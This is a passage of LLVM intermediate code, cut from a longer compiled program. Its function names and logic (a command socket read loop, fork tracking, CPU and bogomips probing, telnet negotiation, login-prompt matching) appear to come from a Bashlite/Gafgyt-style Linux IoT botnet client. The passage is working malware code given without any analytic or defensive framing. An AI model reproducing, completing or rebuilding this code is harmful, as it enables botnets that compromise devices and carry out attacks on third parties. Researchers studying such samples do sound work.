  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

